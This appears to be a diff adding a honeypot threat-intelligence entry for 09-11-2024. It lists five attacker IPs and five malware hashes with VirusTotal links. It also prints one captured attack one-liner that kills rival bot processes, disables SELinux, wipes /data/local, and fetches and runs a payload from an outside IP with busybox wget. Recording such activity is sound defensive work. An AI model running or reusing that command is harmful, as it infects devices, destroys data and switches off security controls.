@@ -1,0 +1,30 @@
+Top 5 IPs for 09-11-2024 :
+
+119.115.191.197
+1.43.157.180
+98.102.58.10
+119.82.224.2
+117.195.250.1
+
+Malware Observed:
+
+File name : sshd
+d19deb758dff3796bc025446c3adf690b2c20a535328a697f3c04ea2319a2535
+https://www.virustotal.com/gui/file/d19deb758dff3796bc025446c3adf690b2c20a535328a697f3c04ea2319a2535
+
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+Commands/exploits observed :
+
+kill -9 $(ps -eo pid,%cpu,cmd --sort=-%cpu | awk 'NR>1 && $3 !~ /^(sh)/ && $2 > 15 && $1 != '$$' {print $1}');pkill -9 main_arm;pkill -9 main_arm7; pkill -9 main_x86;pkill -9 main_x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.bot || cd /data/local/bot; rm -rf *;su 0 iptables -9;setenforce 0;busybox wget http://45.124.95.225/and || su 0 busybox wget http://45.124.95.225/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.bot;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
+
